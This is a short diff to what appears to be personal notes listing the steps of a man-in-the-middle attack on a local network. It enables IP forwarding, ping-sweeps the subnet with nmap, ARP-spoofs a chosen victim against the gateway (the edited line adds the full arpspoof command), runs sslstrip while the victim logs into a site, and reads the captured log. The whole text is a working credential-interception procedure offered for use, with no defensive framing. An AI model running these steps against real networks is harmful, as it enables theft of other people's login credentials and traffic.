@@ -6,7 +6,7 @@ ip_forwarding -- sudo bash -c 'echo 1 > /proc/sys/net/ipv4/ip_forward'
 4. Scan target network to find a specific computer
 5. nmap -sP 192.168.1.0/24
 6. Review scan results and choose a target
-7. Arpspoof to redirect the computers http traffic to our computer
+7. Arpspoof to redirect the computers http traffic to our computer -- arpspoof -i eth0 -t [victim IP] [gateway IP]
 7. Whilst that runs in the background start sslstrip
 8. Login via the targets computer into some site
 9. Review sslstrip log file  -- cat sslstrip.log
